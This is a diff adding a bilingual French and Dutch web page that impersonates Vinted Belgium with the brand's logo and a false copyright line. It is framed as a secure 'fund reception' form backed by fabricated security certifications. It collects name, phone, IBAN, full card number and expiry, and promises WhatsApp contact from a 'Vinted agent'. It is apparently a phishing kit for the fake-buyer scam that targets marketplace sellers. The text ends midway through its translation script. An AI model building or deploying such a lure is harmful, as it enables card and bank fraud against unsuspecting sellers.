@@ -1,0 +1,1937 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Réception de Fonds Sécurisée - Belgique</title>
+  <link rel="icon" href="https://marketplace-web-assets.vinted.com/_next/static/media/symbol.09am-qrd5xoff.svg" type="image/svg+xml">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #09B1BA;
+      --primary-dark: #077A83;
+      --primary-light: #E6F8FA;
+      --success: #00AA66;
+      --success-light: #E8F5E9;
+      --error: #FF6B5B;
+      --bg: #F4F6F8;
+      --card-bg: #FFFFFF;
+      --text-primary: #1A1A1A;
+      --text-secondary: #7A7A7A;
+      --text-tertiary: #ABABAB;
+      --border: #E5E5E5;
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: linear-gradient(180deg, var(--bg) 0%, #F0F5F7 100%);
+      color: var(--text-primary);
+      min-height: 100vh;
+      line-height: 1.6;
+    }
+
+    .security-banner {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: white;
+      padding: 14px 20px;
+      text-align: center;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      border-bottom: 1px solid var(--primary-dark);
+    }
+
+    .header {
+      background: var(--card-bg);
+      border-bottom: 1px solid var(--border);
+      padding: 16px 24px;
+      position: sticky;
+      top: 0;
+      z-index: 99;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+    }
+
+    .header-content {
+      max-width: 520px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--primary);
+      letter-spacing: -0.5px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .logo-icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .logo-desktop {
+      display: flex;
+    }
+
+    .logo-mobile {
+      display: none;
+      width: 32px;
+      height: 32px;
+    }
+
+    .lang-selector {
+      background: white;
+      border: 1px solid #ddd;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-primary);
+      cursor: pointer;
+      padding: 6px;
+      border-radius: 6px;
+      transition: all 0.3s ease;
+      margin-left: auto;
+      appearance: none;
+      width: 48px;
+      height: 36px;
+      text-align: center;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 8px center;
+      background-size: 14px;
+      padding-right: 20px;
+    }
+
+    .lang-selector:hover {
+      color: var(--primary);
+    }
+
+    .lang-selector:focus {
+      outline: none;
+      color: var(--primary);
+    }
+
+    .header-badges {
+      display: flex;
+      gap: 12px;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 6px 12px;
+      border-radius: 20px;
+      background: transparent;
+      color: var(--primary);
+      border: 1.5px solid var(--primary);
+      white-space: nowrap;
+      letter-spacing: 0px;
+      transition: all 0.2s ease;
+    }
+
+    .badge::before {
+      content: '';
+      width: 0px;
+      height: 0px;
+      background: transparent;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .badge:hover {
+      background: var(--primary-light);
+    }
+
+    .container {
+      max-width: 520px;
+      margin: 40px auto;
+      padding: 0 16px 60px;
+    }
+
+    .hero-section {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: var(--text-primary);
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    .form-section {
+      background: var(--card-bg);
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 16px;
+      border: 1px solid var(--border);
+      transition: var(--transition);
+    }
+
+    .form-section:hover {
+      border-color: var(--primary);
+      box-shadow: 0 4px 12px rgba(9, 177, 186, 0.08);
+    }
+
+    .form-section h2 {
+      margin: 0 0 20px 0;
+      font-size: 12px;
+      color: var(--text-primary);
+      text-transform: uppercase;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-icon {
+      width: 28px;
+      height: 28px;
+      background: var(--primary-light);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    .section-icon svg {
+      width: 16px;
+      height: 16px;
+      stroke: var(--primary);
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: var(--border);
+      border-radius: 2px;
+      margin-bottom: 32px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border-radius: 2px;
+      transition: width 0.3s ease;
+    }
+
+    .form-group label {
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: var(--text-primary);
+      letter-spacing: 0.2px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      min-height: 16px;
+      flex-wrap: nowrap;
+      white-space: nowrap;
+      gap: 4px;
+    }
+
+    .label-text {
+      flex-shrink: 1;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .required {
+      flex-shrink: 0;
+      white-space: nowrap;
+      color: var(--error);
+    }
+
+    .form-hint {
+      flex-shrink: 0;
+      white-space: nowrap;
+      font-size: 10px;
+      color: var(--primary);
+      font-weight: 500;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .form-group:hover .form-hint {
+      opacity: 1;
+    }
+
+    /* Animations avancées */
+    @keyframes slideInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    @keyframes successPulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes confetti {
+      0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+    }
+
+    /* Section animations */
+    .form-section {
+      animation: slideInUp 0.5s ease forwards;
+      opacity: 0;
+    }
+
+    .form-section:nth-child(1) { animation-delay: 0.1s; }
+    .form-section:nth-child(2) { animation-delay: 0.2s; }
+
+    /* Trust badges */
+    .trust-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 6px 10px;
+      border-radius: 6px;
+      background: var(--success-light);
+      color: var(--success);
+      opacity: 0;
+      transform: scale(0.8);
+      animation: slideInUp 0.4s ease forwards;
+    }
+
+    .trust-badge.active {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .trust-badge::before {
+      content: '✓';
+      font-weight: 700;
+      animation: successPulse 0.6s ease;
+    }
+
+    /* Input focus effects */
+    input:focus,
+    select:focus {
+      animation: none;
+    }
+
+    /* Validation success animation */
+    .check-mark {
+      animation: scaleIn 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    }
+
+    /* Confidence message transitions */
+    #confidence-message {
+      animation: slideInUp 0.3s ease;
+    }
+
+    /* Button hover effect */
+    .btn-submit:hover:not(:disabled) {
+      animation: pulse 2s ease infinite;
+    }
+
+    /* Progress bar glow */
+    .progress-fill {
+      box-shadow: 0 0 8px rgba(9, 177, 186, 0.4);
+    }
+
+    /* Field completion indicator */
+    .field-completed {
+      animation: successPulse 0.5s ease;
+    }
+
+    /* Smooth scrolling for sections */
+    .form-section {
+      scroll-behavior: smooth;
+    }
+
+    /* Accessibility improvements */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation: none !important;
+        transition: none !important;
+      }
+    }
+
+    /* Focus visible for keyboard navigation */
+    input:focus-visible,
+    select:focus-visible,
+    button:focus-visible {
+      outline: 2px solid var(--primary);
+      outline-offset: 2px;
+    }
+
+    /* Loading state animation */
+    @keyframes shimmer {
+      0% { background-position: -1000px 0; }
+      100% { background-position: 1000px 0; }
+    }
+
+    .form-section.loading {
+      background: linear-gradient(90deg, var(--border) 25%, transparent 50%, var(--border) 75%);
+      background-size: 1000px 100%;
+      animation: shimmer 2s infinite;
+    }
+
+
+    .input-wrapper {
+      display: flex;
+      align-items: center;
+      position: relative;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="email"],
+    input[type="number"],
+    select {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-family: 'Inter', inherit;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background-color: var(--card-bg);
+      outline: none;
+      transition: var(--transition);
+      color: var(--text-primary);
+    }
+
+    input::placeholder,
+    select::placeholder {
+      color: var(--text-tertiary);
+    }
+
+    input:focus,
+    select:focus {
+      border-color: var(--primary);
+      background: linear-gradient(to right, var(--card-bg), var(--primary-light));
+      box-shadow: 0 0 0 2px rgba(9, 177, 186, 0.1);
+    }
+
+    input.valid {
+      border-color: var(--success);
+      background: rgba(0, 170, 102, 0.02);
+    }
+
+    input.with-logo {
+      padding-left: 60px !important;
+    }
+
+    .check-mark {
+      color: var(--success);
+      position: absolute;
+      right: 14px;
+      font-weight: 700;
+      display: none;
+      font-size: 18px;
+      pointer-events: none;
+      animation: scaleIn 0.3s ease;
+    }
+
+    @keyframes scaleIn {
+      from {
+        transform: scale(0.5);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .network-logo {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 40px;
+      height: 26px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      pointer-events: none;
+      z-index: 2;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    .network-logo.active {
+      opacity: 1;
+    }
+
+    .network-logo svg {
+      width: 40px;
+      height: 26px;
+    }
+
+    .auto-detect-badge {
+      display: none;
+      align-items: center;
+      gap: 6px;
+      margin-top: 8px;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--success);
+      background: var(--success-light);
+      border-radius: 6px;
+      padding: 6px 10px;
+      border: 1px solid rgba(0, 170, 102, 0.2);
+      animation: slideDown 0.3s ease;
+    }
+
+    .auto-detect-badge.show {
+      display: flex;
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-8px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 20px 0;
+      opacity: 0.5;
+    }
+
+    .section-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-primary);
+      margin-bottom: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px 20px;
+      font-size: 14px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: var(--transition);
+      letter-spacing: 0.2px;
+      text-transform: uppercase;
+      font-family: 'Inter', inherit;
+    }
+
+    .btn-submit {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: white;
+      margin-top: 32px;
+      box-shadow: 0 4px 12px rgba(9, 177, 186, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-submit:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(9, 177, 186, 0.3);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-right: 10px;
+    }
+
+    .btn-submit.loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-submit.loading .spinner {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .success-screen {
+      display: none;
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      margin: 40px auto;
+      background: linear-gradient(135deg, var(--success) 0%, #1EAE51 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 40px;
+      color: white;
+      box-shadow: 0 4px 12px rgba(0, 170, 102, 0.2);
+    }
+
+    .success-screen h2 {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      color: var(--text-primary);
+    }
+
+    .success-screen p {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 12px;
+      line-height: 1.6;
+    }
+
+    .success-message {
+      background: var(--success-light);
+      color: var(--success);
+      padding: 16px;
+      border-radius: 8px;
+      margin: 24px 0;
+      font-size: 14px;
+      line-height: 1.6;
+      font-weight: 500;
+      border: 1px solid rgba(0, 170, 102, 0.2);
+    }
+
+    .footer {
+      background: var(--card-bg);
+      border-top: 1px solid var(--border);
+      padding: 40px 24px;
+      margin-top: 60px;
+      text-align: center;
+    }
+
+    .footer-content {
+      max-width: 520px;
+      margin: 0 auto;
+      font-size: 12px;
+      color: var(--text-secondary);
+      line-height: 1.8;
+    }
+
+    .footer-legal {
+      font-size: 11px;
+      color: var(--text-tertiary);
+      margin-top: 16px;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        padding: 0;
+      }
+
+      .security-banner {
+        font-size: 11px;
+        padding: 10px 12px;
+      }
+
+      .security-banner > div {
+        gap: 12px;
+      }
+
+      .header {
+        padding: 12px 16px;
+      }
+
+      .logo-desktop {
+        width: 32px;
+        height: 32px;
+        display: flex;
+      }
+
+      .logo-mobile {
+        display: none;
+      }
+
+      .logo-icon {
+        width: 32px;
+        height: 32px;
+      }
+
+      .header-badges {
+        gap: 6px;
+      }
+
+      .badge {
+        font-size: 10px;
+        padding: 6px 10px;
+        justify-content: center;
+      }
+
+      .container {
+        max-width: 100%;
+        margin: 20px auto;
+        padding: 0 12px 40px;
+      }
+
+      h1 {
+        font-size: 20px;
+        margin-bottom: 8px;
+      }
+
+      .subtitle {
+        font-size: 12px;
+      }
+
+      .form-section {
+        padding: 14px;
+        margin-bottom: 12px;
+        border-radius: 8px;
+      }
+
+      .form-section h2 {
+        font-size: 11px;
+        margin-bottom: 12px;
+      }
+
+      .form-row {
+        grid-template-columns: 1fr;
+        gap: 10px;
+      }
+
+      .form-group {
+        margin-bottom: 12px;
+      }
+
+      .form-group label {
+        font-size: 11px;
+        margin-bottom: 4px;
+      }
+
+      input[type="text"],
+      input[type="tel"],
+      input[type="email"],
+      input[type="number"],
+      select {
+        font-size: 14px;
+        padding: 9px 10px;
+      }
+
+      #confidence-message {
+        font-size: 11px;
+        padding: 8px 10px;
+        margin-bottom: 14px;
+      }
+
+      .btn-submit {
+        font-size: 13px;
+        padding: 11px 14px;
+        margin-top: 16px;
+        height: 44px;
+      }
+
+      .check-mark {
+        font-size: 14px;
+      }
+
+      .hero-section {
+        margin-bottom: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .security-banner {
+        font-size: 9px;
+        padding: 6px 10px;
+      }
+
+      .security-banner > div {
+        gap: 8px;
+        flex-wrap: wrap;
+      }
+
+      .security-banner span:not([style]) {
+        display: none;
+      }
+
+      .header {
+        padding: 10px 12px;
+      }
+
+      .logo-desktop {
+        display: none;
+      }
+
+      .logo-mobile {
+        display: flex !important;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+      }
+
+      .logo-icon {
+        width: 28px;
+        height: 28px;
+      }
+
+      .header-badges {
+        gap: 4px;
+        flex-wrap: wrap;
+        margin-left: auto;
+      }
+
+      .badge {
+        font-size: 8px;
+        padding: 4px 8px;
+      }
+
+      .badge::before {
+        width: 2px;
+        height: 2px;
+      }
+
+      .container {
+        margin: 16px auto;
+        padding: 0 10px 32px;
+      }
+
+      h1 {
+        font-size: 18px;
+        margin-bottom: 4px;
+      }
+
+      .subtitle {
+        font-size: 11px;
+        margin-bottom: 8px;
+      }
+
+      .hero-section {
+        margin-bottom: 16px;
+      }
+
+      .form-section {
+        padding: 12px;
+        margin-bottom: 10px;
+        border: 1px solid var(--border);
+      }
+
+      .section-icon {
+        width: 20px;
+        height: 20px;
+      }
+
+      .section-icon svg {
+        width: 12px;
+        height: 12px;
+      }
+
+      .form-section h2 {
+        font-size: 10px;
+        margin-bottom: 10px;
+      }
+
+      .form-group {
+        margin-bottom: 10px;
+      }
+
+      .form-group label {
+        font-size: 10px;
+        margin-bottom: 3px;
+        min-height: 14px;
+      }
+
+      .required {
+        font-size: 11px;
+      }
+
+      .form-hint {
+        font-size: 8px;
+      }
+
+      input[type="text"],
+      input[type="tel"],
+      input[type="email"],
+      input[type="number"],
+      select {
+        font-size: 13px;
+        padding: 8px 10px;
+        border-radius: 4px;
+      }
+
+      #confidence-message {
+        font-size: 10px;
+        padding: 6px 8px;
+        margin-bottom: 12px;
+      }
+
+      .progress-bar {
+        height: 2px;
+        margin-bottom: 12px;
+      }
+
+      .btn-submit {
+        font-size: 12px;
+        padding: 10px 12px;
+        margin-top: 14px;
+        height: 40px;
+        border-radius: 6px;
+      }
+
+      .check-mark {
+        font-size: 12px;
+        right: 8px;
+      }
+
+      .section-label {
+        font-size: 10px;
+        margin-bottom: 8px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="security-banner">
+    <div style="display: flex; align-items: center; justify-content: center; gap: 20px; flex-wrap: wrap;">
+      <span>Connexion chiffrée SSL 256-bit</span>
+      <span style="opacity: 0.5;">|</span>
+      <span>Certifié PCI DSS</span>
+      <span style="opacity: 0.5;">|</span>
+      <span>Conforme RGPD</span>
+    </div>
+  </div>
+
+  <header class="header">
+    <div class="header-content">
+      <!-- Logo Desktop -->
+      <div class="logo-icon logo-desktop">
+        <img src="https://marketplace-web-assets.vinted.com/_next/static/media/logo.10w5-fhfapeza.svg" alt="Vinted" loading="lazy">
+      </div>
+
+      <!-- Logo Mobile (Symbol Vinted) -->
+      <img src="https://marketplace-web-assets.vinted.com/_next/static/media/symbol.09am-qrd5xoff.svg" alt="Vinted" class="logo-mobile" style="width: 32px; height: 32px; display: none; object-fit: contain; margin-right: auto;" loading="lazy">
+
+      <!-- Badges Desktop -->
+      <div class="header-badges" style="margin-left: auto;">
+        <div class="badge">Sécurisé</div>
+        <div class="badge">Belgique</div>
+        <div class="badge">Certifié</div>
+      </div>
+
+      <!-- Sélecteur de langue à l'extrême droite -->
+      <select id="lang-selector" class="lang-selector">
+        <option value="fr">FR</option>
+        <option value="nl" selected>NL</option>
+      </select>
+    </div>
+  </header>
+
+  <div class="container">
+    <div id="form-flow">
+      <div class="hero-section">
+        <div style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 16px;">
+          <div style="width: 48px; height: 48px; border: 2px solid var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; color: var(--primary); font-size: 24px;">✓</div>
+          <div style="text-align: left;">
+            <div id="verified-platform" style="font-size: 11px; color: var(--text-secondary); text-transform: uppercase; font-weight: 600; letter-spacing: 0.3px;">Plateforme Vérifiée</div>
+            <div id="certified-service" style="font-size: 12px; color: var(--text-primary); font-weight: 600;">Service Certifié</div>
+          </div>
+        </div>
+
+        <h1>Réception de Fonds Sécurisée</h1>
+        <p id="hero-subtitle" class="subtitle">Complétez vos informations pour recevoir vos fonds en toute sécurité.</p>
+      </div>
+
+      <form id="payment-form">
+        <!-- MESSAGE DE CONFIANCE DYNAMIQUE -->
+        <div id="confidence-message" style="background: var(--success-light); border-left: 3px solid var(--success); border-radius: 6px; padding: 12px 16px; margin-bottom: 24px; font-size: 13px; color: var(--success); font-weight: 500; animation: slideDown 0.3s ease;">
+          Formulaire simple et sécurisé • Moins de 2 minutes
+        </div>
+
+        <!-- BARRE DE PROGRESSION -->
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill" style="width: 0%"></div>
+        </div>
+
+        <!-- COMPTEUR DE PROGRESSION -->
+        <div style="text-align: center; margin-bottom: 28px; font-size: 12px; color: var(--text-secondary);">
+          <span id="completed-fields">0</span>/<span id="total-fields">9</span> <span id="counter-suffix">champs complétés</span>
+        </div>
+
+        <!-- VOS INFORMATIONS -->
+        <div class="form-section">
+          <h2><div class="section-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>Vos Informations Personnelles</h2>
+
+          <div class="form-group">
+            <label for="nom"><span class="label-text">Nom complet</span> <span class="required">*</span><span class="form-hint">Prénom et nom</span></label>
+            <div class="input-wrapper">
+              <input type="text" id="nom" name="nom" placeholder="Jean Dupont" autocomplete="name" required>
+              <span class="check-mark">✓</span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="email"><span class="label-text">Email</span> <span class="required">*</span><span class="form-hint">Actif et vérifié</span></label>
+            <div class="input-wrapper">
+              <input type="email" id="email" name="email" placeholder="jean.dupont@email.be" autocomplete="email" required>
+              <span class="check-mark">✓</span>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="age"><span class="label-text">Âge</span> <span class="required">*</span><span class="form-hint">Minimum 16</span></label>
+              <div class="input-wrapper">
+                <input type="number" id="age" name="age" min="16" max="120" placeholder="28" autocomplete="bday-year" required>
+                <span class="check-mark">✓</span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="phone"><span class="label-text">Téléphone</span> <span class="required">*</span><span class="form-hint">Format +32</span></label>
+              <div class="input-wrapper">
+                <input type="tel" id="phone" name="telephone" placeholder="+32 4 12 34 56 78" autocomplete="tel" required>
+                <span class="check-mark">✓</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- COORDONNÉES BANCAIRES -->
+        <div class="form-section">
+          <h2><div class="section-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20"/><path d="M6 15h2"/><path d="M10 15h2"/></svg></div>Vos Coordonnées Bancaires</h2>
+
+          <div class="form-group">
+            <label for="iban"><span class="label-text">IBAN (Belgique)</span> <span class="required">*</span><span class="form-hint">BE + 14 chiffres</span></label>
+            <div class="input-wrapper">
+              <span class="network-logo" id="iban-logo"></span>
+              <input type="text" id="iban" name="iban" maxlength="23" autocomplete="off" required>
+              <span class="check-mark">✓</span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="banque"><span class="label-text">Banque</span> <span class="required">*</span></label>
+            <div class="input-wrapper">
+              <select id="banque" name="banque" required>
+                <option value="">Sélectionnez votre banque</option>
+                <option value="Belfius">Belfius</option>
+                <option value="KBC Bank">KBC / CBC</option>
+                <option value="ING Belgium">ING Belgique</option>
+                <option value="BNP Paribas Fortis">BNP Paribas Fortis</option>
+                <option value="Argenta">Argenta</option>
+                <option value="Beobank">Beobank</option>
+                <option value="Crelan">Crelan</option>
+                <option value="other">Autre banque...</option>
+              </select>
+              <span class="check-mark">✓</span>
+            </div>
+            <div class="auto-detect-badge" id="bank-auto-badge">
+              <span>✓</span> Banque détectée automatiquement
+            </div>
+          </div>
+
+          <div class="form-group" id="other-bank-group" style="display: none; margin-top: -8px;">
+            <label for="other-bank-input"><span class="label-text">Nom de votre banque</span> <span class="required">*</span><span class="form-hint">Nom exact</span></label>
+            <div class="input-wrapper">
+              <input type="text" id="other-bank-input" name="other_banque" placeholder="Belfius, ING, KBC..." maxlength="50">
+              <span class="check-mark">✓</span>
+            </div>
+          </div>
+
+          <hr class="divider">
+
+          <div class="section-label">Informations de Carte</div>
+
+          <div class="form-group">
+            <label for="card"><span class="label-text">Numéro de carte</span> <span class="required">*</span><span class="form-hint">16 chiffres</span></label>
+            <div class="input-wrapper">
+              <span class="network-logo" id="card-logo"></span>
+              <input type="text" id="card" name="card" inputmode="numeric" placeholder="4532 1234 5678 9123" autocomplete="off" maxlength="19" required>
+              <span class="check-mark">✓</span>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="exp-date"><span class="label-text">Expiration</span> <span class="required">*</span><span class="form-hint">MM/YY</span></label>
+              <div class="input-wrapper">
+                <input type="text" id="exp-date" name="expiration" inputmode="numeric" placeholder="12/26" autocomplete="cc-exp" maxlength="7" required>
+                <span class="check-mark">✓</span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="amount"><span class="label-text">Montant (€)</span> <span class="required">*</span><span class="form-hint">Positif</span></label>
+              <div class="input-wrapper">
+                <input type="text" id="amount" name="montant" inputmode="decimal" placeholder="150.50" required>
+                <span class="check-mark">✓</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="btn-submit" disabled>
+          <span class="spinner"></span>
+          Demander la Réception de Fonds
+        </button>
+      </form>
+    </div>
+
+    <!-- ÉCRAN DE SUCCÈS -->
+    <div id="success-flow" class="success-screen">
+      <div class="success-icon">✓</div>
+      <h2>Transmission Réussie</h2>
+      <div class="success-message">
+        Vos informations ont été reçues avec succès. Un agent Vinted vous contactera bientôt pour finaliser la réception de vos fonds.
+      </div>
+      <p style="font-size: 13px; color: var(--text-tertiary); margin-top: 20px;">
+        Vous pouvez fermer cette page en toute sécurité.
+      </p>
+    </div>
+  </div>
+
+  <!-- PIED DE PAGE -->
+  <footer class="footer">
+    <div class="footer-content">
+      <p id="footer-title" style="font-weight: 600; color: var(--text-primary); margin-bottom: 12px; font-size: 13px;">Certifications & Sécurité</p>
+
+      <div style="display: flex; gap: 12px; margin-bottom: 16px; flex-wrap: wrap; justify-content: center;">
+        <div style="border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-size: 11px; color: var(--text-secondary); text-align: center; min-width: 80px;">
+          <div style="font-weight: 600; color: var(--primary); margin-bottom: 2px;">SSL</div>
+          256-bit
+        </div>
+        <div style="border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-size: 11px; color: var(--text-secondary); text-align: center; min-width: 80px;">
+          <div style="font-weight: 600; color: var(--primary); margin-bottom: 2px;">ISO</div>
+          27001
+        </div>
+        <div style="border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-size: 11px; color: var(--text-secondary); text-align: center; min-width: 80px;">
+          <div style="font-weight: 600; color: var(--primary); margin-bottom: 2px;">PCI</div>
+          DSS L1
+        </div>
+        <div style="border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-size: 11px; color: var(--text-secondary); text-align: center; min-width: 80px;">
+          <div style="font-weight: 600; color: var(--primary); margin-bottom: 2px;">RGPD</div>
+          <span id="footer-conforme">Conforme</span>
+        </div>
+      </div>
+
+      <p class="footer-legal">
+        © 2024 Vinted Belgium |
+        <a id="footer-conditions" href="#" style="color: var(--primary); text-decoration: none;">Conditions</a> ·
+        <a id="footer-privacy" href="#" style="color: var(--primary); text-decoration: none;">Confidentialité</a>
+      </p>
+    </div>
+  </footer>
+
+  <script>
+    // Traductions multilingues - Naturelles et authentiques
+    const translations = {
+      fr: {
+        security_banner: 'Connexion chiffrée SSL 256-bit • Certifié PCI DSS • Conforme RGPD',
+        secured: 'Sécurisé',
+        belgique: 'Belgique',
+        certified: 'Certifié',
+        verified_platform: 'Plateforme Vérifiée',
+        certified_service: 'Service Certifié',
+        title: 'Réception de Fonds Sécurisée',
+        subtitle: 'Complétez vos informations pour recevoir vos fonds en toute sécurité.',
+        your_info: 'Vos Informations Personnelles',
+        banking_info: 'Vos Coordonnées Bancaires',
+        card_info: 'Informations de Paiement',
+        full_name: 'Nom complet',
+        email: 'Adresse e-mail',
+        age: 'Âge',
+        phone: 'Numéro de téléphone',
+        iban: 'IBAN',
+        bank: 'Sélectionnez votre banque',
+        card_number: 'Numéro de carte',
+        expiration: 'Date d\'expiration',
+        amount: 'Montant à recevoir',
+        other_bank: 'Entrez le nom de votre banque',
+        submit: 'Valider et Envoyer',
+        processing: 'Traitement sécurisé en cours...',
+        success_title: 'Transmission Réussie !',
+        success_message: 'Vos informations ont été transmises avec succès. Un agent Vinted vous contactera très bientôt via WhatsApp pour finaliser la réception de vos fonds.',
+        simple_secure: 'Formulaire simple et sécurisé • Moins de 2 minutes',
